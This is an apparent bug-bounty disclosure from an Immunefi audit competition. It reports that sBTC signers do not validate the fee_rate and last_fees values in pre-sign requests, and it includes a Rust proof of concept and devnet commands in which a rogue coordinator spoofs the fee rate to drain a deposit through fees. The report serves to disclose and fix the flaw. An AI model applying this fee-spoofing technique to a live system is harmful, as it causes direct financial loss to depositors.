# #38605 \[BC-Low] Lack of fee\_rate/last\_fees validation in handle\_bitcoin\_pre\_sign\_request ebables rog

**Submitted on Jan 7th 2025 at 18:34:32 UTC by @niroh for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #38605
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/signer>
* **Impacts:**
  * Direct loss of funds

## Description

## Brief/Intro

As part of the sweep tx creation/validation process, the coordinator creates a transaction package and sends it for signers to pre-approve. If the package is approved by enough signers, the package transactions are then signed and broadcasted. Package pre approval is handled by signers in handle\_bitcoin\_pre\_sign\_request. Signers validate every significant detail in the package through their own db/client-connections to avoid trusting the coordinator who, as a single entity, is not trusted and may try to compromize the system.

One exception however is the fee\_rate and last\_fees which are provided at part of the PreSignRequest and are not validated by the signers. This enables a rogue signer to maliciously cause financal loss to depositors by spoofing the current fee\_rate required by the bitcoin blockchain, or by spoofing last\_fees even though no existing package is in the mempool (both having the same effect of imposing an unneccesarily exccesive fee on depositors).

## Vulnerability Details

### Attack scenario:

1. A rogue signer decides to compromize the sbtc system's reputation/reliability by causing financial loss to depositors.
2. Whenever its this signer's turn to be a coordinator, they search through all current valid, pending deposits for deposit requests with very high max\_fee settings.
3. If the signer finds such requests, they "spoof" the fee\_rate retrieved from the bitcoin client to a much higher value. The signer chooses a value that is just high enough to extract the maximum fee posiible from the deposit/s without failing the minimum max\_fee validation test.
4. The signer constructs a transaction package with the spoofed fee\_rate. Given the bloated fee\_rate, deposit requests with a conservative max\_fee setting will be filtered out, leaving only those with high enough max\_fee to pass the max\_fee validation even with the spoofed fee\_rate.
5. The Signer then sends a preSignRequest for the package. Since the only invalid data in the package is the fee\_rate (which in itself is not validated by signers) the package is approved and signed.
6. A sweep transaction is sent with an abnormally high fee\_rate that can drain the entire deposit amount.

## Impact Details

Financial loss caused to depositors: their deposit is processed but with a fee\_rate that is much higher than the real chain fee\_rate causing them to pay a fee that is orders of magnitude higher than they should have.

## Recommendation

### fee\_rate validation

While the exact fee\_rate might change between the time the Coordinator samples it and the time the signers validate the PreSignRequest, you could check for some reasonable deviation between the two (e.g. fee\_rate given in the preSignRequest is within 20% of the one obtained by the signer).

### last\_fee validation

Since the same attack can be achieved by spoofing a last\_fee, signers should also validate last\_fee, obtaining it in the same way the coordinator does (should have the same value as provided by the coordinator).

## References

<https://github.com/stacks-network/sbtc/blob/83b316c5d26a3434a1b53d558bc7f899ce6c03f2/signer/src/transaction\\_coordinator.rs#L1317> <https://github.com/stacks-network/sbtc/blob/83b316c5d26a3434a1b53d558bc7f899ce6c03f2/signer/src/bitcoin/validation.rs#L224>

## Proof of Concept

## Proof of Concept

This POC simulates a scenario where a single deposit request is pending with max\_fee = 1602000 and amount = 1682100. The coordinator sets a fake fee\_rate of 6000 (the maximum that will still enable the deposit request to pass the max\_fee validation). The depositor ends up paying a fee of 1,410,000 (\~$1373), about x100 what they would pay if the real fee\_rate (typically 60 on the devenv) was used.

### How to run

1. Make the following temporary change in sbtc/signer/src/bitcoin/transaction\_coordianator.rs line 1227:

```rust
let fee_rate = 6000.0;//bitcoin_client.estimate_fee_rate().await?; 
```

2. Create a backup for demo\_cli.rs and replace its content with the code below.\
   Main changes:\
   **a.** Instead of setting the deposit tx amount to the sum of the call parameters 'amount' and 'max\_fee', we assume the given 'amount' parameter represents the total amount and set the deposit amount to 'amount' only.\
   **b.** A donation is added at the start of exec\_deposit because we call demo\_cli directly and not through the shell script that handles donation.

```rust
use std::str::FromStr;

use bitcoin::hex::DisplayHex;
use bitcoin::{
    absolute, transaction::Version, Amount, Network, OutPoint, ScriptBuf, Sequence, Transaction,
    TxIn, TxOut,
};
use bitcoin::{Address, XOnlyPublicKey};
use bitcoincore_rpc::json;
use bitcoincore_rpc::{Client, RpcApi};
use clap::{Args, Parser, Subcommand};
use clarity::{
    types::{chainstate::StacksAddress, Address as _},
    vm::types::{PrincipalData, StandardPrincipalData},
};
use emily_client::{
    apis::{
        configuration::{ApiKey, Configuration},
        deposit_api,
    },
    models::CreateDepositRequestBody,
};
use fake::Fake as _;
use rand::rngs::OsRng;
use sbtc::deposits::{DepositScriptInputs, ReclaimScriptInputs};
use secp256k1::PublicKey;
use signer::config::Settings;
use signer::keys::SignerScriptPubKey;
use signer::storage::model::StacksPrincipal;

#[derive(Debug, thiserror::Error)]
#[allow(clippy::enum_variant_names)]
enum Error {
    #[error("Signer error: {0}")]
    SignerError(#[from] signer::error::Error),
    #[error("Bitcoin RPC error: {0}")]
    BitcoinRpcError(#[from] bitcoincore_rpc::Error),
    #[error("Invalid Bitcoin address: {0}")]
    InvalidBitcoinAddress(#[from] bitcoin::address::ParseError),
    #[error("No available UTXOs")]
    NoAvailableUtxos,
    #[error("Secp256k1 error: {0}")]
    Secp256k1Error(#[from] secp256k1::Error),
    #[error("SBTC error: {0}")]
    SbtcError(#[from] sbtc::error::Error),
    #[error("Emily deposit error: {0}")]
    EmilyDeposit(#[from] emily_client::apis::Error<deposit_api::CreateDepositError>),
    #[error("Invalid stacks address: {0}")]
    InvalidStacksAddress(String),
    #[error("Invalid signer key: {0}")]
    InvalidSignerKey(String),
}

#[derive(Debug, Parser)]
struct CliArgs {
    #[clap(subcommand)]
    command: CliCommand,
}

#[derive(Debug, Subcommand)]
enum CliCommand {
    /// Simulate a deposit request
    Deposit(DepositArgs),
    Donation(DonationArgs),
    Info(InfoArgs),
}

#[derive(Debug, Args)]
struct DepositArgs {
    /// Amount to deposit in satoshis, excluding the fee.
    #[clap(long)]
    amount: u64,
    /// Maximum fee to pay for the transaction in satoshis, in addition to
    /// the amount.
    #[clap(long)]
    max_fee: u64,
    /// Lock time for the transaction.
    #[clap(long)]
    lock_time: u32,
    /// The beneficiary Stacks address to receive the deposit in sBTC.
    #[clap(long = "stacks-addr")]
    stacks_recipient: String,
    /// The public key of the aggregate signer.
    #[clap(long = "signer-key")]
    signer_aggregate_key: String,
}

#[derive(Debug, Args)]
struct DonationArgs {
    /// Amount to deposit in satoshis, excluding the fee.
    #[clap(long)]
    amount: u64,
    /// The public key of the aggregate signer.
    #[clap(long = "signer-key")]
    signer_aggregate_key: String,
}

#[derive(Debug, Args)]
struct InfoArgs {
    /// The public key of the aggregate signer.
    #[clap(long = "signer-key")]
    signer_aggregate_key: String,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = CliArgs::parse();

    let settings = Settings::new(Some("signer/src/config/default.toml"))?;

    // Setup our Emily client configuration by getting the first configured endpoint
    // and using that to populate the client.
    let mut emily_api_endpoint = settings
        .emily
        .endpoints
        .first()
        .expect("No Emily endpoints configured")
        .clone();

    let emily_api_key = if emily_api_endpoint.username().is_empty() {
        None
    } else {
        Some(ApiKey {
            prefix: None,
            key: emily_api_endpoint.username().to_string(),
        })
    };

    let _ = emily_api_endpoint.set_username("");

    let emily_client_config = Configuration {
        base_path: emily_api_endpoint
            .to_string()
            .trim_end_matches("/")
            .to_string(),
        api_key: emily_api_key,
        ..Default::default()
    };

    let bitcoin_url = format!(
        "{}wallet/depositor",
        settings
            .bitcoin
            .rpc_endpoints
            .first()
            .expect("No Bitcoin RPC endpoints configured")
    );

    let bitcoin_client = Client::new(
        &bitcoin_url,
        bitcoincore_rpc::Auth::UserPass("devnet".into(), "devnet".into()),
    )
    .expect("Failed to create Bitcoin RPC client");

    match args.command {
        CliCommand::Deposit(args) => {
            exec_deposit(args, &bitcoin_client, &emily_client_config).await?
        }
        CliCommand::Donation(args) => exec_donation(args, &bitcoin_client).await?,
        CliCommand::Info(args) => exec_info(args).await?,
    }

    Ok(())
}

async fn exec_deposit(
    args: DepositArgs,
    bitcoin_client: &Client,
    emily_config: &Configuration,
) -> Result<(), Error> {

    //Audit Comment: donation added here since the POC calls this file directly and not through the shell script that handles donation before the call
    let donargs = DonationArgs{amount:2000000u64,
        signer_aggregate_key:args.signer_aggregate_key.clone()};
    exec_donation(donargs,bitcoin_client).await?;


    let (unsigned_tx, deposit_script, reclaim_script) =
        create_bitcoin_deposit_transaction(bitcoin_client, &args)?;

    let txid = unsigned_tx.compute_txid();

    let signed_tx = bitcoin_client.sign_raw_transaction_with_wallet(&unsigned_tx, None, None)?;
    println!("Signed transaction: {:?}", hex::encode(&signed_tx.hex));
    let tx = bitcoin_client.send_raw_transaction(&signed_tx.hex)?;
    println!("Transaction sent: calculated txid {txid:?}, actual txid {tx:?}");

    let emily_deposit = deposit_api::create_deposit(
        emily_config,
        CreateDepositRequestBody {
            bitcoin_tx_output_index: 0,
            bitcoin_txid: txid.to_string(),
            deposit_script: deposit_script.deposit_script().to_hex_string(),
            reclaim_script: reclaim_script.reclaim_script().to_hex_string(),
        },
    )
    .await?;

    println!("Deposit request created: {:?}", emily_deposit);

    Ok(())
}

async fn exec_donation(args: DonationArgs, bitcoin_client: &Client) -> Result<(), Error> {
    let pubkey = XOnlyPublicKey::from_str(&args.signer_aggregate_key)
        .or_else(|_| PublicKey::from_str(&args.signer_aggregate_key).map(XOnlyPublicKey::from))
        .map_err(|_| Error::InvalidSignerKey(args.signer_aggregate_key.clone()))?;

    // Look for UTXOs that can cover the amount + max fee
    let opts = json::ListUnspentQueryOptions {
        minimum_amount: Some(Amount::from_sat(args.amount)),
        ..Default::default()
    };

    let unspent = bitcoin_client
        .list_unspent(Some(6), None, None, None, Some(opts))?
        .into_iter()
        .next()
        .ok_or(Error::NoAvailableUtxos)?;

    // Get a new address for change (SegWit)
    let change_address = bitcoin_client
        .get_new_address(None, Some(json::AddressType::Bech32))?
        .require_network(Network::Regtest)?;

    // Create the unsigned transaction
    let unsigned_tx = Transaction {
        input: vec![TxIn {
            previous_output: OutPoint {
                txid: unspent.txid,
                vout: unspent.vout,
            },
            script_sig: Default::default(),
            sequence: Sequence::ZERO,
            witness: Default::default(),
        }],
        output: vec![
            TxOut {
                value: Amount::from_sat(args.amount),
                script_pubkey: pubkey.signers_script_pubkey(),
            },
            TxOut {
                value: Amount::from_sat(unspent.amount.to_sat() - args.amount - 153),
                script_pubkey: change_address.into(),
            },
        ],
        version: Version::TWO,
        lock_time: absolute::LockTime::ZERO,
    };

    let signed_tx = bitcoin_client.sign_raw_transaction_with_wallet(&unsigned_tx, None, None)?;
    println!("Signed transaction: {:?}", hex::encode(&signed_tx.hex));
    let tx = bitcoin_client.send_raw_transaction(&signed_tx.hex)?;

    println!("Transaction sent: {tx:?}");

    Ok(())
}

async fn exec_info(args: InfoArgs) -> Result<(), Error> {
    let pubkey = XOnlyPublicKey::from_str(&args.signer_aggregate_key)
        .or_else(|_| PublicKey::from_str(&args.signer_aggregate_key).map(XOnlyPublicKey::from))
        .map_err(|_| Error::InvalidSignerKey(args.signer_aggregate_key.clone()))?;
    println!("Signers pubkey (for bridge): {pubkey}");

    let address =
        Address::from_script(&pubkey.signers_script_pubkey(), bitcoin::Network::Regtest).unwrap();
    println!("Signers bitcoin address (for donation): {address}");

    let random_principal: StacksPrincipal = fake::Faker.fake_with_rng(&mut OsRng);
    println!(
        "Random stacks address (for demo recipient): {}",
        *random_principal
    );

    Ok(())
}

fn create_bitcoin_deposit_transaction(
    client: &Client,
    args: &DepositArgs,
) -> Result<(Transaction, DepositScriptInputs, ReclaimScriptInputs), Error> {
    let pubkey = XOnlyPublicKey::from_str(&args.signer_aggregate_key)
        .or_else(|_| PublicKey::from_str(&args.signer_aggregate_key).map(XOnlyPublicKey::from))
        .map_err(|_| Error::InvalidSignerKey(args.signer_aggregate_key.clone()))?;

    let deposit_script = DepositScriptInputs {
        signers_public_key: pubkey,
        max_fee: args.max_fee,
        recipient: PrincipalData::Standard(StandardPrincipalData::from(
            StacksAddress::from_string(&args.stacks_recipient)
                .ok_or(Error::InvalidStacksAddress(args.stacks_recipient.clone()))?,
        )),
    };

    let reclaim_script = ReclaimScriptInputs::try_new(args.lock_time, ScriptBuf::new())?;

    //Audit Comment: changed to set only amount as deposit amount (without adding max_fee)
    // Look for UTXOs that can cover the amount 
    let opts = json::ListUnspentQueryOptions {
        minimum_amount: Some(Amount::from_sat(args.amount /*+ args.max_fee*/)),
        ..Default::default()
    };
    let unspent = client
        .list_unspent(Some(6), None, None, None, Some(opts))?
        .into_iter()
        .next()
        .ok_or(Error::NoAvailableUtxos)?;

    // Get a new address for change (SegWit)
    let change_address = client
        .get_new_address(None, Some(json::AddressType::Bech32))?
        .require_network(Network::Regtest)?;

    // Create the unsigned transaction
    let unsigned_tx = Transaction {
        input: vec![TxIn {
            previous_output: OutPoint {
                txid: unspent.txid,
                vout: unspent.vout,
            },
            script_sig: Default::default(),
            sequence: Sequence::ZERO,
            witness: Default::default(),
        }],
        output: vec![
            TxOut {
                value: Amount::from_sat(args.amount /*+ args.max_fee*/),
                script_pubkey: sbtc::deposits::to_script_pubkey(
                    deposit_script.deposit_script(),
                    reclaim_script.reclaim_script(),
                ),
            },
            TxOut {
                value: Amount::from_sat(unspent.amount.to_sat() - args.amount /*- args.max_fee*/ - 153),
                script_pubkey: change_address.into(),
            },
        ],
        version: Version::TWO,
        lock_time: absolute::LockTime::ZERO,
    };

    println!(
        "deposit script: {:?}",
        deposit_script
            .deposit_script()
            .as_bytes()
            .to_lower_hex_string()
    );
    println!(
        "reclaim script: {:?}",
        reclaim_script
            .reclaim_script()
            .as_bytes()
            .to_lower_hex_string()
    );

    Ok((unsigned_tx, deposit_script, reclaim_script))
}

```

3. Rebuild the docker: `docker compose -f docker/docker-compose.yml --profile default --profile bitcoin-mempool --profile sbtc-signer build`
4. Run the devnet docker with make devenv-up
5. Once the system is up, run ./signers.sh info to get the SIGNERS\_KEY
6. run `cargo run -p signer --bin demo-cli deposit --amount 1682100 --max-fee 1602000 --lock-time 50 --stacks-addr ST2SBXRBJJTH7GV5J93HJ62W2NRRQ46XYBK92Y039 --signer-key SIGNERS_KEY`
7. Check the local bitcoin explorer (localhost:8083) and see that the sweep transaction is executed with a fee of 1,410,100 (\~$1373).
8. Check the Stacks local explorer and see that a complete transaction was executed, hoever the amount minted to the recipient is only 272,100.
